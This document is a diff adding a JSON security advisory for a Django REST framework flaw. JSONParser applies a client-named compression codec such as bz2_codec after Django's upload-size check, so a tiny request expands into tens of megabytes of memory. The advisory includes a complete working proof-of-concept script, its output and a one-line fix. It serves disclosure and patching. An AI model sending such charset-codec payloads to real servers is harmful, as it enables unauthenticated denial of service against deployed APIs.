@@ -1,0 +1,101 @@
+{
+  "id": "GHSA-3547-9m27-7rxg",
+  "modified": "2026-10-22T16:30:29.914382203Z",
+  "published": "2026-10-22T16:16:09Z",
+  "aliases": [
+    "CVE-2026-114136"
+  ],
+  "summary": "Django REST framework: JSONParser applies an attacker-named codec to the request stream",
+  "details": "### Summary\n\nAn unauthenticated attacker can defeat Django's `DATA_UPLOAD_MAX_MEMORY_SIZE` limit and force a\nworker process to allocate arbitrary memory, by naming a compression codec in the Content-Type\ncharset parameter. A 108-byte request body produces a 50,331,648-character value inside the view, an\namplification factor of 466,033, and grows process peak RSS by about 97 MiB. No application\nconfiguration is required beyond DRF's default parser set; the endpoint only has to accept a JSON\nbody.\n\n### Details\n\n`JSONParser.parse` decodes the request body with the charset the client supplied on the Content-Type\nheader:\n\n```python\n# rest_framework/parsers.py\nencoding = parser_context.get('encoding', settings.DEFAULT_CHARSET)\ntry:\n    decoded_stream = codecs.getreader(encoding)(stream)\n    parse_constant = json.strict_constant if self.strict else None\n    return json.load(decoded_stream, parse_constant=parse_constant)\nexcept ValueError as exc:\n    raise ParseError('JSON parse error - %s' % str(exc))\n```\n\nOf the roughly 455 codec names `codecs.lookup` resolves on CPython 3.14, about 18 are byte transforms\ninstead of character sets: `bz2_codec`, `zlib_codec`, `base64_codec`, `hex_codec`, `quopri_codec`,\n`uu_codec` and similar. `codecs.getreader` is the only entry point in the `codecs` module that does\nnot consult `CodecInfo._is_text_encoding`, so it accepts all of them. Sending\n`Content-Type: application/json; charset=bz2_codec` wraps the request stream in a bz2 decompressor\nbefore `json.load` reads it.\n\nThe ordering is what makes this exploitable. Django charges `DATA_UPLOAD_MAX_MEMORY_SIZE` against the\nbytes that arrived on the wire: `rest_framework/request.py` hands `JSONParser` an\n`io.BytesIO(self.body)`, and `HttpRequest.body` is where `_check_data_too_big()` runs. Decompression\nhappens afterwards, inside the parser, where nothing is counting.\n\nThis is DRF's defect and not Django's. Django resolves the charset parameter and assigns\n`request.encoding`, and `codecs.lookup` does resolve byte transforms, but every Django consumer of\n`request.encoding` goes through the text-codec API and fails closed. Both `bytes.decode('bz2_codec')`\nand `str(raw, 'bz2_codec')` raise\n`LookupError: 'bz2_codec' is not a text encoding; use codecs.decode() to handle arbitrary codecs`.\nDRF is the only caller that hands the request stream to `codecs.getreader`.\n\n`FormParser` (`parsers.py:84`) and `MultiPartParser` (`parsers.py:104-118`) take the same client-named\nencoding but fail closed instead of amplifying.\n\nThe sink was introduced by `9a228116` (PR #5147, 2017-05-24, \"Improve memory footprint when reading\nlarge JSON requests\"), first released in 3.6.4. The final comment on that PR observes the intended\nmemory gain does not hold because `read()` decodes the whole stream, which is the same property that\nmakes this expansion unbounded. No `_is_text_encoding` check has been added since.\n\nA one-line fix at `parsers.py:61-64`:\n\n```python\nif not codecs.lookup(encoding)._is_text_encoding:\n    raise ParseError('Unsupported charset in Content-Type')\n```\n\n### PoC\n\nSave as `poc_charset_amplification.py` and run it. It builds its own payloads, runs each arm in a\nfresh subprocess (peak RSS is a high-water mark, so measuring several arms in one process reports\nnear-zero growth for every arm after the first), and prints a verdict.\n\n```python\n#!/usr/bin/env python\n\"\"\"\ndjango-rest-framework: JSONParser applies an attacker-named codec to the request\nstream, defeating DATA_UPLOAD_MAX_MEMORY_SIZE.\n\nFour arms, each in a fresh subprocess because peak RSS is a high-water mark and\nmeasuring several arms in one process reports ~0 growth for every arm after the\nfirst.\n\n  T   ~108-byte bz2 body, Content-Type: application/json; charset=bz2_codec\n  C1  48 MiB plaintext,   Content-Type: application/json   (no charset)\n  C2  the byte-identical T body, charset=utf-8\n  C3  zlib body, charset=zlib_codec\n\nThe claim is T AND C1 AND C2. C1 proves the size limit is live; C2 proves the\ncodec name and not the payload is what produces the expansion.\n\nRequires: django, djangorestframework importable. No arguments, nothing to edit.\n    python poc_charset_amplification.py\nExit status 0 means every arm behaved as described in the advisory.\n\"\"\"\nimport hashlib\nimport json\nimport os\nimport subprocess\nimport sys\nimport tempfile\n\nPAYLOAD_CHARS = 48 * 1024 * 1024\nPAYLOAD_DIR = os.path.join(tempfile.gettempdir(), \"drf-charset-amp\")\nLIMIT = 65536\n\nARMS = {\n    \"T\": (\"bz2.bin\", \"application/json; charset=bz2_codec\"),\n    \"C1\": (\"plain.bin\", \"application/json\"),\n    \"C2\": (\"bz2.bin\", \"application/json; charset=utf-8\"),\n    \"C3\": (\"zlib.bin\", \"application/json; charset=zlib_codec\"),\n}\nEXPECTED = {\n    \"T\": \"HTTP 200, parsed value orders of magnitude larger than the wire bytes\",\n    \"C1\": \"rejected with RequestDataTooBig, view body never runs\",\n    \"C2\": \"HTTP 400 ParseError on the byte-identical compressed body\",\n    \"C3\": \"HTTP 200, same expansion under a different codec name\",\n}\nVIEW_RAN = []\n\n\ndef build_payloads():\n    import bz2\n    import zlib\n\n    os.makedirs(PAYLOAD_DIR, exist_ok=True)\n    plain = b'{\"a\":\"' + b\"A\" * PAYLOAD_CHARS + b'\"}'\n    blobs = {\n        \"plain.bin\": plain,\n        \"bz2.bin\": bz2.compress(plain, 9),\n        \"zlib.bin\": zlib.compress(plain, 9),\n    }\n    for name, blob in blobs.items():\n        with open(os.path.join(PAYLOAD_DIR, name), \"wb\") as fh:\n            fh.write(blob)\n    return {name: len(blob) for name, blob in blobs.items()}\n\n\ndef configure_django():\n    from django.conf import settings\n\n    settings.configure(\n        DEBUG=False,\n        ALLOWED_HOSTS=[\"testserver\"],\n        SECRET_KEY=\"poc\",\n        ROOT_URLCONF=__name__,\n        MIDDLEWARE=[],\n        INSTALLED_APPS=[\n            \"django.contrib.contenttypes\",\n            \"django.contrib.auth\",\n            \"rest_framework\",\n        ],\n        DATABASES={\n            \"default\": {\"ENGINE\": \"django.db.backends.sqlite3\", \"NAME\": \":memory:\"}\n        },\n        DEFAULT_CHARSET=\"utf-8\",\n        DATA_UPLOAD_MAX_MEMORY_SIZE=LIMIT,\n        LOGGING_CONFIG=None,\n        USE_TZ=True,\n    )\n    import django\n\n    django.setup()\n\n\ndef build_view():\n    from rest_framework.response import Response\n    from rest_framework.views import APIView\n\n    class Echo(APIView):\n        authentication_classes = []\n        permission_classes = []\n\n        def post(self, request):\n            data = request.data\n            VIEW_RAN.append(True)\n            value = data.get(\"a\") if isinstance(data, dict) else None\n            return Response(\n                {\"parsed_value_len\": len(value) if isinstance(value, str) else None}\n            )\n\n    return Echo\n\n\ndef __getattr__(name):\n    # ROOT_URLCONF points at this module; build urlpatterns lazily.\n    if name == \"urlpatterns\":\n        from django.urls import path\n\n        value = [path(\"x\", build_view().as_view())]\n        globals()[\"urlpatterns\"] = value\n        return value\n    raise AttributeError(name)\n\n\ndef peak_rss_kib():\n    \"\"\"Peak resident size of this process. /proc is used where available because\n    ru_maxrss does not track the calling process on every kernel.\"\"\"\n    try:\n        with open(\"/proc/self/status\") as fh:\n            for line in fh:\n                if line.startswith(\"VmHWM:\"):\n                    return int(line.split(\":\")[1].strip().split()[0])\n    except OSError:\n        pass\n    import resource\n\n    return resource.getrusage(resource.RUSAGE_SELF).ru_maxrss\n\n\ndef run_arm(arm):\n    payload_name, content_type = ARMS[arm]\n    with open(os.path.join(PAYLOAD_DIR, payload_name), \"rb\") as fh:\n        body = fh.read()\n\n    configure_django()\n    from django.test import Client, RequestFactory\n\n    client = Client(raise_request_exception=False)\n    # Warm every lazily imported module so the delta measures the request only.\n    client.generic(\"POST\", \"/x\", data=b'{\"a\":\"A\"}', content_type=\"application/json\")\n    VIEW_RAN.clear()\n\n    before = peak_rss_kib()\n    response = client.generic(\"POST\", \"/x\", data=body, content_type=content_type)\n    after = peak_rss_kib()\n\n    parsed_len = None\n    if response.status_code == 200:\n        try:\n            parsed_len = json.loads(response.content).get(\"parsed_value_len\")\n        except ValueError:\n            pass\n\n    # Second reading via a bare RequestFactory so the exception class is visible\n    # directly instead of inferred from a status code.\n    request = RequestFactory().generic(\n        \"POST\", \"/x\", data=body, content_type=content_type\n    )\n    try:\n        direct = {\"status_code\": build_view().as_view()(request).status_code}\n    except BaseException as exc:  # noqa: BLE001 - naming the class is the point\n        direct = {\"exception\": f\"{type(exc).__module__}.{type(exc).__name__}\"}\n\n    return {\n        \"arm\": arm,\n        \"content_type\": content_type,\n        \"transmitted_bytes\": len(body),\n        \"body_sha256\": hashlib.sha256(body).hexdigest(),\n        \"status_code\": response.status_code,\n        \"view_body_executed\": bool(VIEW_RAN),\n        \"parsed_value_len\": parsed_len,\n        \"amplification_ratio\": round(parsed_len / len(body), 1) if parsed_len else None,\n        \"peak_rss_delta_mib\": round((after - before) / 1024.0, 1),\n        \"direct_dispatch\": direct,\n    }\n\n\ndef check(arm, r):\n    if arm in (\"T\", \"C3\"):\n        return (\n            r[\"status_code\"] == 200\n            and r[\"view_body_executed\"]\n            and r[\"parsed_value_len\"] == PAYLOAD_CHARS\n            and r[\"amplification_ratio\"] \u003e= 700\n        )\n    if arm == \"C1\":\n        return (\n            r[\"status_code\"] != 200\n            and not r[\"view_body_executed\"]\n            and r[\"direct_dispatch\"].get(\"exception\")\n            == \"django.core.exceptions.RequestDataTooBig\"\n        )\n    if arm == \"C2\":\n        return r[\"status_code\"] == 400 and not r[\"view_body_executed\"]\n    raise AssertionError(arm)\n\n\ndef main():\n    if \"--arm\" in sys.argv:\n        print(json.dumps(run_arm(sys.argv[sys.argv.index(\"--arm\") + 1])))\n        return 0\n\n    sizes = build_payloads()\n    print(f\"# payload sizes: {sizes}\")\n    print(f\"# DATA_UPLOAD_MAX_MEMORY_SIZE = {LIMIT}\")\n    print(f\"# JSON string value under test: {PAYLOAD_CHARS} characters\\n\")\n\n    ok = True\n    results = {}\n    for arm in (\"T\", \"C1\", \"C2\", \"C3\"):\n        proc = subprocess.run(\n            [sys.executable, os.path.abspath(__file__), \"--arm\", arm],\n            capture_output=True,\n            text=True,\n        )\n        if proc.returncode != 0:\n            print(f\"{arm}: harness failed\\n{proc.stderr}\")\n            return 2\n        r = json.loads(proc.stdout.strip().splitlines()[-1])\n        results[arm] = r\n        passed = check(arm, r)\n        ok = ok and passed\n        print(f\"=== {arm}  [{'as described' if passed else 'NOT as described'}]\")\n        print(f\"    expected: {EXPECTED[arm]}\")\n        print(json.dumps(r, indent=6))\n        print()\n\n    print(\"=== summary\")\n    for arm, r in results.items():\n        print(\n            f\"    {arm:3} wire={r['transmitted_bytes']:\u003e9}B  status={r['status_code']}  \"\n            f\"parsed_len={r['parsed_value_len']}  ratio={r['amplification_ratio']}  \"\n            f\"peak_rss_delta={r['peak_rss_delta_mib']} MiB  view_ran={r['view_body_executed']}\"\n        )\n    print(f\"\\n    T and C1 and C2: {'all held' if ok else 'NOT all held'}\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```\n\nObserved output, abbreviated to the summary block:\n\n```\n# payload sizes: {'plain.bin': 50331656, 'bz2.bin': 108, 'zlib.bin': 48941}\n# DATA_UPLOAD_MAX_MEMORY_SIZE = 65536\n# JSON string value under test: 50331648 characters\n\n=== summary\n    T   wire=      108B  status=200  parsed_len=50331648  ratio=466033.8  peak_rss_delta=96.8 MiB  view_ran=True\n    C1  wire= 50331656B  status=400  parsed_len=None      ratio=None      peak_rss_delta=48.3 MiB  view_ran=False\n    C2  wire=      108B  status=400  parsed_len=None      ratio=None      peak_rss_delta=0.0 MiB   view_ran=False\n    C3  wire=    48941B  status=200  parsed_len=50331648  ratio=1028.4    peak_rss_delta=95.2 MiB  view_ran=True\n\n    T and C1 and C2: all held\n```\n\nC1 establishes that the size limit is live and configured, so the 200 in T is a defeated guard and\nnot an absent one. C1 reports its own RSS growth because the client holds the 48 MiB body before the\nlimit rejects it, which is client-side cost and never reaches the view. C2 carries most of the\nweight: its body is byte-identical to T, and only the codec name differs. RSS figures vary by a few\nMiB between runs.\n\nRepeating all four arms on Django 5.2.17 LTS gave 109 wire bytes to 50,331,648 characters, 461,758x,\nwith C1 and C2 both holding.\n\nOne note if you re-implement the request yourself: use `Client.generic()` or\n`RequestFactory().generic()`. Both `Client.post()` and `RequestFactory.post()` push the body through\n`force_bytes(data, encoding=\u003ccharset\u003e)` (`django/test/client.py:438-447`), which destroys a compressed\npayload before the parser sees it.\n\n### Impact\n\nUnauthenticated denial of service through memory amplification, against any endpoint that accepts a\nJSON body with the default parser set. Every deployment on 3.6.4 or later is affected, and no\napplication code or configuration choice opts into it. Memory is per-request and released afterwards,\nwhich is why this is rated on availability alone rather than as Critical, but the amplification factor\nmeans a small number of concurrent requests can exhaust a worker. A few hundred bytes allocates\nhundreds of megabytes, and nothing in DRF or Django bounds the expanded size.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "djangorestframework",
+        "purl": "pkg:pypi/djangorestframework"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.6.4"
+            },
+            {
+              "fixed": "3.18.2"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.10.0",
+        "3.10.1",
+        "3.10.2",
+        "3.10.3",
+        "3.11.0",
+        "3.11.1",
+        "3.11.2",
+        "3.12.0",
+        "3.12.1",
+        "3.12.2",
+        "3.12.3",
+        "3.12.4",
+        "3.13.0",
+        "3.13.1",
+        "3.14.0",
+        "3.15.0",
+        "3.15.1",
+        "3.15.2",
+        "3.16.0",
+        "3.16.1",
+        "3.17.0",
+        "3.17.1",
+        "3.17.2",
+        "3.18.0",
+        "3.18.1",
+        "3.6.4",
+        "3.7.0",
+        "3.7.1",
+        "3.7.2",
+        "3.7.3",
+        "3.7.4",
+        "3.7.5",
+        "3.7.6",
+        "3.7.7",
+        "3.8.0",
+        "3.8.1",
+        "3.8.2",
+        "3.9.0",
+        "3.9.1",
+        "3.9.2",
+        "3.9.3",
+        "3.9.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-3547-9m27-7rxg/GHSA-3547-9m27-7rxg.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/encode/django-rest-framework/security/advisories/GHSA-3547-9m27-7rxg"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-114136"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/encode/django-rest-framework/commit/3c2634599b26a9f789b03045118dbc276117611a"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/encode/django-rest-framework"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/encode/django-rest-framework/releases/tag/3.18.2"
+    }
+  ]
+}
